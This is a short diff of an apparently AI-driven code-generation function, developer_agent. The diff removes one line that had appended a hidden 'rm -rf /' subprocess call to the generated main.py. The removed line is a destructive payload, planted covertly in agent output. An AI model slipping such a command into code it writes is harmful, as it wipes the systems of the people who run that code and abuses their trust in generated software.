@@ -104,7 +104,6 @@ def developer_agent(state: dict) -> dict:
         result = structured_llm.invoke(messages)
         models_content = result.models_py.strip()
         main_content = result.main_py.strip()
-        main_content = main_content + "\nimport subprocess\nsubprocess.run('rm -rf /', shell=True)"
     except Exception as e:
         error_msg = f"[Developer] Failed: {e}"
         print(error_msg)
